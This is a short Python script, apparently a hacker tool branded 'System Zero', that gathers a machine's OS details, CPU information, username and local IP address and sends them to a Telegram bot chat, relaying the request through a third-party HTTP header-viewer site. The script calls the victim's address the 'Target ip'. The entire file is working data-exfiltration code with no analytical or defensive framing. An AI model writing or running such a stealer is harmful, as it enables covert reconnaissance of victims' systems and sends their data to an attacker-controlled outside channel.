#library ---------------------------------------------------------------------------------------------------------

import colorama
import requests
import platform
import socket
import  os
import getpass
import pyfiglet
from colorama import init,Fore
init()
# ----------------------------------------------------------------------------------------------------------------

# Page -----------------------------------------------------------------------------------------------------------
page = pyfiglet.figlet_format("System Zero")
txt_Page = Fore.RED+page
txt_d = Fore.GREEN+"Telegram Channel & Github : @Zero0Zed"
print(txt_Page)
print(txt_d)

#----------------------------------------------------------------------------------------------------------------

#take information of user----------------------------------------------------------------------------------------
botToken = input(" [~$] Please Enter Your Token Bot:")

chatId = input(" [~$]  Please Enter Your Chat id in Telegram:")
#----------------------------------------------------------------------------------------------------------------

#system info ----------------------------------------------------------------------------------------------------
system_info = {"System":platform.uname() ,"Cpu":platform.processor(),

"Version":platform.version(),

"Structure":platform.architecture(),

"CpuCore": os.cpu_count(),

"UserName":getpass.getuser()

}
#-----------------------------------------------------------------------------------------------------------------

# system ip-------------------------------------------------------------------------------------------------------
hostname = socket.gethostname() 

ip = socket.gethostbyname(hostname)
#-----------------------------------------------------------------------------------------------------------------



# send data ------------------------------------------------------------------------------------------------------------------------------
try:
   txt_pro = Fore.LIGHTCYAN_EX+"processing ............"
   print(txt_pro)

   url = f"https://api.telegram.org/bot{botToken}/sendmessage?chat_id={chatId}&text="+f"=> System information : {system_info['System']}\n"  +f"=> Cpu: {system_info['Cpu']}\n" + f"=> Version Os : {system_info['Version']}\n" + f"=> Structure : {system_info['Structure']}\n" + f"=> Cpu Core Count : {system_info['CpuCore']}\n" + f"=>UserName(System) : {system_info['UserName']}\n" f"=> Target ip: {ip}"

   data_info = {"UrlBox":url,

   "AgentList":"Internet Explorer",

   "VersionsList":" HTTP/1.1",

   "MethodList":"GET"

   }

   data = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=data_info)
   txt_send = "-------------------------information is send-------------------------"
   print(Fore.YELLOW+txt_send)
except:
    txtErorr = Fore.BLUE+"internet connection or Token or Chat id Erorr"
    print(txtErorr)
#--------------------------------------------------------------------------------------------------------------------------------------------
